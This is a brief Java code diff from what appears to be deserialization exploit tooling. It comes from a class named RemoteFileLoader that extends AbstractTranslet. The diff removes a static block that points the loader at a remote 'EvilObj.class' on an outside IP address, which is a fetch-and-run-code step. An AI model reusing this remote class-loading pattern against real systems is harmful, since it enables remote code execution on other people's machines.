@@ -41,11 +41,6 @@ public class RemoteFileLoader extends AbstractTranslet implements Serializable {
 
     }
 
-    static {
-        url = "http://129.211.89.169:1098/EvilObj.class";
-        classname = "EvilObj";
-    }
-
     public static void main(String[] args) {
         RemoteFileLoader loader = new RemoteFileLoader();
     }
